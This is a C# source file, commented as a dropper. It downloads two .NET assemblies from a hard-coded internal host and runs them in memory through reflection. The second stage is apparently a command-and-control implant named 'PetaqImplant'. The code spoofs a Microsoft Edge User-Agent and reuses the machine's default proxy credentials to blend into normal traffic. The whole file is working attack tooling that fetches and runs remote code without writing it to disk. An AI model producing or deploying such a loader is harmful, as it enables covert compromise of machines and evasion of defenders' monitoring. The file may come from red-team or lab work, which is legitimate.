using System;
using System.Reflection;
using System.Net;

public class Program
{

    public static void Main()
    {
        // No arguments as it's a dropper, static parameters only 

        // Base URL for downloading stages
        string url = "http://172.16.168.134/tools/" ; 

        // .NET Assembly names, types and methods for Stage 1 and Stage 2
        string[,] assemblies = new string[2,3] { 
            {"pa", "A", "B"}, 
            {"pi", "PetaqImplant.Program", "Main"} 
        };

        // Web client will have proxy settings and credentials
        WebClient client = GetWebClient();

        // Load the assembly information for each array            
        for (int i = 0; i < 2; i++) {
            // Download the assembly
            byte[] data = client.DownloadData(url+assemblies[i,0]);

            // Invoke the assembly with static parameters
            Esa(data, assemblies[i,1], assemblies[i,2]);

        }


        
    }

    public static void Esa(byte[] sharpassembly, string tn, string mn)
    {
        // Loading the assembly
        Assembly asl = Assembly.Load(sharpassembly);

        // Instead of Entrypoint, find the type and method manually
        // Make sure the main is public in the implant assembly

        // Type
        Type t = asl.GetType(tn);

        // Method 
        MethodInfo m = t.GetMethod(mn); 
    
        // Create the instance
        object o = asl.CreateInstance(m.Name);

        // No parameters
        object[] ao = new object[] {new string[] { }};

        // // start as a thread 
        // ThreadStart ths;

        // // no parameters for now
        // ths = new ThreadStart(() => m.Invoke(o, ao));

        m.Invoke(o, ao);

        // Thread th = new Thread(ths);
        // th.Start();
        
        return;
    }

    public static WebClient GetWebClient()
    {
        WebClient client = new WebClient();

        // set the User-Agent in the configuration (taken from Microsoft Edge)
        client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Edg/85.0.564.63");

        // get the default proxy if there is
        client.Proxy = new System.Net.WebProxy();

        // get the credentials for the proxy if there is
        client.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;

        return client;
    }
    
}
